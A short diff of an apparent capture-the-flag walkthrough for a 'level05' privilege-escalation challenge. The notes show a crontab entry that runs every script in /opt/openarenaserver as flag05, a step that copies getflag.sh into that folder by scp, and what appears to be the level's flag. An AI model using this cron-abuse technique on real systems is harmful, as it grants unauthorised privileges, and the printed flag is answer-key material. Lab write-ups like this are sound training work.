@@ -6,6 +6,6 @@
 - cat /var/mail/level05
 	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 <- crontab task every 2 minutes
 - cat /usr/sbin/openarenaserver <- runs every program inside /opt/openarenaserver
-- scp -P 4242 getflag.sh level05@192.168.1.?:/opt/openarenaserver
 - watch cat /tmp/result
+- scp -P 4242 getflag.sh level05@192.168.1.?:/opt/openarenaserver
 	viuaaale9huek52boumoomioc
